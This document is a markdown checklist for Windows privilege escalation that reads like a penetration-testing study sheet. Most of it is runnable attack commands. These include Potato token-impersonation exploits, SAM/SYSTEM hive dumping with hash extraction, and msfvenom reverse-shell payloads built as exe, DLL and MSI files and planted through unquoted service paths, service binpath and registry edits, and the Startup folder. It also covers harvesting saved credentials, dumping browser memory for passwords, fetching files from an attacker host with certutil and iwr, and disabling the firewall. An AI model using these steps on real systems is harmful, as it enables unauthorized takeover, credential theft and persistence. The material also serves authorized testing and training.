# ü™ü Ultimate Windows Privilege Escalation Checklist

## üéØ Methodology (Order of Operations)
1.  **Automated Enum** (WinPEAS - save time)
2.  **Privileges** (`SeImpersonate`, `SeBackup`)
3.  **Services** (Unquoted, BinPath, Permissions)
4.  **Registry & Startup** (Autoruns, AlwaysInstallElevated)
5.  **Passwords** (Files, Memory, SAM)
6.  **Kernel** (Last Resort)

---

## ü§ñ 0. Automated Enumeration (The "I need help" Button)
**Why:** Windows is huge. Doing everything manually takes hours. Use **WinPEAS** first to find the low-hanging fruit.

- [ ] **Run WinPEAS**
    1.  Download `winPEASx64.exe` (or .bat if antivirus kills exe).
    2.  Transfer to target (using python server `python -m http.server 80`).
    3.  Run:
    ```powershell
    # Basic run
    .\winPEASx64.exe
    
    # Run and save to file (Recommended)
    .\winPEASx64.exe > output.txt
    ```
    4.  **Look for RED text.** Red means "High Probability of Privilege Escalation".

---

## ü•î 1. Token Privileges (The "Potato" Attacks)

### 1.1 Check Current Privileges
**Concept:** Windows assigns specific "rights" to users. Some rights (like Impersonation) let you become SYSTEM.
- [ ] **Check Privileges**
    ```cmd
    whoami /priv
    ```
    - **üîª Vuln Found:** `SeImpersonatePrivilege` (Enabled)
        - **Explanation:** You are likely a Service Account (IIS, SQL). You can trick the SYSTEM account into talking to you, then steal its ID card.
        - **Action:** Use **GodPotato** (Newer) or **JuicyPotato** (Older).

- [ ] **Exploit: GodPotato (Works on Server 2019/2022)**
    1.  Download `GodPotato` executable.
    2.  Command:
    ```cmd
    # Syntax: GodPotato -cmd "command to run"
    .\GodPotato.exe -cmd "net localgroup administrators <your_user> /add"
    ```

- [ ] **Exploit: JuicyPotato (Works on Server 2016/Older)**
    1.  Download `JuicyPotato.exe`.
    2.  Command:
    ```cmd
    # -l (listening port), -p (payload), -t * (create process), -c (CLSID)
    .\JuicyPotato.exe -l 1337 -p c:\temp\reverse.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
    ```

### 1.2 SeBackup / SeRestore Privilege
- [ ] **Check Privileges**
    - **üîª Vuln Found:** `SeBackupPrivilege`
        - **Explanation:** You can read *any* file to back it up, including the password database (SAM/SYSTEM).
        - **Action:**
        ```cmd
        # 1. Create a script to backup the hives
        mkdir c:\temp
        reg save hklm\sam c:\temp\sam
        reg save hklm\system c:\temp\system
        
        # 2. Download 'sam' and 'system' files to your Kali machine.
        
        # 3. Extract hashes (on Kali)
        impacket-secretsdump -sam sam -system system LOCAL
        
        # 4. Crack hash or Pass-The-Hash.
        ```

---

## ‚öôÔ∏è 2. Service Exploits (The Meat)

### 2.1 Unquoted Service Paths
**Concept:** A service path is `C:\Program Files\My Service\service.exe`. If it lacks quotes `" "`, Windows tries to run `C:\Program.exe` first. If you can write `Program.exe` there, you win.
- [ ] **Check:**
    ```cmd
    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
    ```
- [ ] **Verify Permissions:**
    ```cmd
    # Can we write to the folder with the space?
    icacls "C:\Program Files\Vulnerable Service Path"
    # Look for (W) or (F) or (M) for your user group.
    ```
- [ ] **Exploit:**
    1.  Create `Common.exe` (or whatever the path breaks at).
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o Common.exe
    ```
    2.  Move it to the gap:
    ```cmd
    copy Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
    ```
    3.  Restart Service:
    ```cmd
    sc stop <service_name>
    sc start <service_name>
    # Or reboot if you can't stop it.
    ```

### 2.2 Weak Service Permissions (BinPath)
**Concept:** You have permission to edit the service configuration itself. You can change *what* exe the service runs.
- [ ] **Check (AccessChk):**
    ```cmd
    # Download Sysinternals AccessChk
    accesschk64.exe -wuvc <your_user> * -accepteula
    ```
    - **üîª Vuln Found:** `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`.
- [ ] **Exploit:**
    ```cmd
    # 1. Change the binary path to your payload (or a net user command)
    sc config <service_name> binpath= "net localgroup administrators <your_user> /add"
    
    # 2. Start the service
    sc start <service_name>
    
    # 3. Verify
    net localgroup administrators
    ```

### 2.3 Weak Service Executable Permissions
**Concept:** The service config is locked, but the actual `.exe` file (`C:\Program Files\App\svc.exe`) allows "Everyone" to write to it.
- [ ] **Check:**
    ```cmd
    # Use AccessChk on the file itself
    accesschk64.exe -wvu "C:\Program Files\App\service.exe" -accepteula
    # Or use icacls
    icacls "C:\Program Files\App\service.exe"
    ```
    - **üîª Vuln Found:** `FILE_ALL_ACCESS` or `RW` for Everyone/Users.
- [ ] **Exploit:**
    ```cmd
    # 1. Backup original
    move "C:\Program Files\App\service.exe" "C:\Program Files\App\service.bak"
    
    # 2. Copy your payload
    copy C:\Temp\reverse.exe "C:\Program Files\App\service.exe"
    
    # 3. Restart Service
    sc stop <service_name>
    sc start <service_name>
    ```

### 2.4 DLL Hijacking
**Concept:** A service tries to load a DLL that doesn't exist. It looks in your current PATH. If you put a malicious DLL there, it loads it.
- [ ] **Check:**
    1.  Usually requires `Procmon` (hard on CLI).
    2.  **Manual Check:** Check all folders in the System `PATH` variable. Are any writable?
    ```powershell
    $env:path -split ";" | Get-Acl | Select-Object Path, AccessToString
    ```
- [ ] **Exploit:**
    1.  Generate DLL Payload:
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijack.dll
    ```
    2.  Copy `hijack.dll` to the writable folder.
    3.  Restart the service.

---

## üìù 3. Registry & Startup Exploits

### 3.1 AlwaysInstallElevated (MSI)
**Concept:** A registry setting allowing ANY user to run an MSI installer as SYSTEM.
- [ ] **Check:**
    ```cmd
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
    - **üîª Vuln Found:** Both return `0x1`.
- [ ] **Exploit:**
    1.  Generate MSI Payload:
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o setup.msi
    ```
    2.  Run on Target:
    ```cmd
    msiexec /quiet /qn /i C:\Temp\setup.msi
    ```

### 3.2 Weak Registry Permissions (Autorun)
**Concept:** You can write to the Registry Key that tells a service what to run.
- [ ] **Check:**
    ```powershell
    Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List
    # Look for services where Users have "FullControl" or "SetValue"
    ```
- [ ] **Exploit:**
    ```cmd
    # Point the ImagePath in registry to your shell
    reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\reverse.exe /f
    
    # Restart service
    sc start <service_name>
    ```

### 3.3 Startup Folder
**Concept:** Drop an exe in the Startup folder. Wait for Admin to log in.
- [ ] **Check Permissions:**
    ```cmd
    icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    ```
    - **üîª Vuln Found:** `BUILTIN\Users:(F)` or `(W)`.
- [ ] **Exploit:**
    1.  Copy payload:
    ```cmd
    copy C:\Temp\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
    ```
    2.  Wait for an admin to log in.

---

## üîê 4. Passwords (Mining)

### 4.1 Files containing Passwords
**Concept:** Admins leave passwords in config files.
- [ ] **Check Unattend.xml (Installation Config):**
    ```cmd
    dir /s C:\Windows\Panther\Unattend.xml
    dir /s C:\Windows\Panther\autounattend.xml
    # If found, read it and look for <Password> tags. Decode Base64 if needed.
    ```
- [ ] **Check Web Configs:**
    ```cmd
    # Search for "connectionString" or "password" in web.config
    findstr /si "password" *.config
    ```
- [ ] **Powershell History:**
    ```cmd
    type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```

### 4.2 Saved Credentials (RunAs / CMDKEY)
**Concept:** Windows saves credentials for other applications.
- [ ] **Check:**
    ```cmd
    cmdkey /list
    ```
    - **üîª Vuln Found:** Output shows `Target: Domain:interactive=Administrator`.
- [ ] **Exploit:**
    ```cmd
    # Run a binary using the saved credentials
    runas /savecred /user:Administrator "C:\Temp\reverse.exe"
    ```

### 4.3 Memory Dump (Task Manager)
**Concept:** Browsers store passwods in RAM.
- [ ] **Exploit:**
    1.  Open Task Manager.
    2.  Right-click `iexplore.exe` or `chrome.exe` -> **Create Dump File**.
    3.  Download `.dmp` file to Kali.
    4.  Run Strings:
    ```bash
    strings chrome.dmp | grep "Authorization: Basic"
    ```
    5.  Decode Base64.

---

## ‚ò¢Ô∏è 5. Kernel Exploits (Last Resort)

**Concept:** If the machine is old and unpatched, the OS itself has a bug that gives root.
- [ ] **Check:**
    1.  Get system info:
    ```cmd
    systeminfo
    ```
    2.  Save output to `sysinfo.txt`.
    3.  On Kali, run **Windows Exploit Suggester (Next Gen)**:
    ```bash
    python3 wes.py sysinfo.txt
    ```
- [ ] **Exploit:**
    1.  Download the compiled exploit suggested (e.g., `MS16-014`).
    2.  Run on target.

---

## üõ†Ô∏è Essential Commands Cheat Sheet
| Task | Command |
| :--- | :--- |
| **Download File** | `certutil -urlcache -f http://<IP>/file.exe file.exe` |
| **Download (PS)** | `iwr -uri http://<IP>/file.exe -outfile file.exe` |
| **Check Services** | `sc query state= all` |
| **User Info** | `net user <username>` |
| **Add Admin** | `net localgroup administrators <user> /add` |
| **Disable FW** | `NetSh Advfirewall set allprofiles state off` |